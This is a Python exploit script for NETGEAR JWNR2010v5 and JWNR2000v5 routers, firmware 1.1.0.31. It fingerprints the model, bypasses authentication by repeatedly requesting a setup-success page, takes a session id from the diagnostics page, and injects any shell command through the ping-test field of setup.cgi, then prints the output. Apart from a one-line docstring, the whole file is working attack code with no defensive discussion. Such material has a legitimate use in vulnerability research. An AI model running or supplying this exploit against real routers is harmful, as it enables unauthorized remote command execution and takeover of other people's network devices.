#!/usr/bin/env python

"""
The following code exploits both, an auth bypass and a command injection bug in NETGEAR JWNR2010v5 and JWNR2000v5 along with others not yet confirmed.
Firmware version analyzed: 1.1.0.31
"""

import sys, re
import urllib, urllib2

KNOWN_MODELS=["JWNR2010v5", "JWNR2000v5"]

def fingerprint_router_model(url):
	request = urllib2.Request(url)
	try: 
		res = urllib2.urlopen(request)
		html = res.read()
		for mod in KNOWN_MODELS:
			if mod in html:
				return mod
	except urllib2.HTTPError as error:
		if error.code == 401:
			model = error.headers['WWW-Authenticate'].split('"')[1].split(" ")[1]
			return model

def unlock_target(url):
	while is_unlocked(url) == False:
		request = urllib2.Request(url + "/BRS_netgear_success.html")
		try: 
			urllib2.urlopen(request)
		except urllib2.HTTPError as error:
			pass

def is_unlocked(url):
	request = urllib2.Request(url)
	try: 
		urllib2.urlopen(request)
		return True
	except urllib2.HTTPError as error:
		if error.code == 401:
			return False

def get_session_id(url):
	request = urllib2.Request(url + "/diag.htm")
	try: 
		res = urllib2.urlopen(request)
		sid = re.search('[0-9a-f]{8}',res.read())
		return sid.group(0)
	except urllib2.HTTPError as error:
		return None

def inject_command(url, sid, cmd):
	payload = '192.168.1.1&&' + cmd
	payload = urllib.quote_plus(payload)
	request = urllib2.Request(url + "/setup.cgi?id=" + sid, data="todo=ping_test&next_file=diagping.htm&c4_IPAddr=" + payload)
	try: 
		res = urllib2.urlopen(request)
		return res.read()
	except urllib2.HTTPError as error:
		return None

def parse_command_output(page):
	return re.search('(?<=[0-9].[0-9]{3}\/[0-9].[0-9]{3}\/[0-9].[0-9]{3} ms)[^>]*(?=<\/textarea><\/td>)', page).group(0)

if __name__ == "__main__":

	try:
		target=sys.argv[1]
		port=int(sys.argv[2])
		cmd=sys.argv[3]
	except:
		print "USAGE: NETGEAR_JWNR2010v5.py <target_ip> <target_port> <command>"
		sys.exit(1)

	url="http://%s:%d" % (target,port)

	print url

	print "[INFO] Fingerprinting router model..."
	model = fingerprint_router_model(url)
	if model in KNOWN_MODELS:
		 print "[INFO] FOUND ROUTER MODEL: " + model
	else:
		print "[ERROR] Router not vulnerable"
		sys.exit(1)


	if is_unlocked(url):
		print "[INFO] Router unlocked"
		print "[INFO] Executing command"
		page = inject_command(url, get_session_id(url) , cmd)
		print parse_command_output(page)
	else:
		print "[INFO] Unlocking router...Executing authentication bypass"
		unlock_target(url)
		print "[INFO] Router unlocked"
		print "[INFO] Executing command"
		page = inject_command(url, get_session_id(url) , cmd)
		print parse_command_output(page)
